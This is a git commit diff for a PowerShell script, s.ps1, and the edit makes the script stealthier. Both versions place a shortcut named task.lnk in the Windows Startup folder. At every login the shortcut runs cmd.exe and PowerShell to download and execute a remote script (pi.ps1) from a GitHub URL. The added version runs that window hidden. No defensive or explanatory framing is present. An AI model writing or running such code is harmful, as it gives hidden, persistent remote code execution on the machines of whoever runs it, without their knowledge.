f44634545827e192cd2ac6380ec9f55ac8a20642
guilegel4 <guilegel4@mail.com>
2025-02-08 21:55:57 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,10 +1,8 @@
-$command = 'powershell -Command "iex (iwr "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/pi.ps1")"'
-$shortcutName = "task.lnk"
-$startupFolder = [System.Environment]::GetFolderPath('Startup')
-$shortcutPath = Join-Path $startupFolder $shortcutName
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = "cmd.exe"
-$shortcut.Arguments = "/c $command"  # /c runs the command and closes the cmd window
-$shortcut.IconLocation = "cmd.exe"   # Optional: use cmd.exe icon
-$shortcut.Save()
+$cmd = 'powershell -WindowStyle Hidden -Command "iex (iwr "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/pi.ps1")"'
+$path = [System.Environment]::GetFolderPath('Startup') + "\task.lnk"
+$ws = New-Object -ComObject WScript.Shell
+$sc = $ws.CreateShortcut($path)
+$sc.TargetPath = "cmd.exe"
+$sc.Arguments = "/c $cmd"
+$sc.IconLocation = "cmd.exe"
+$sc.Save()
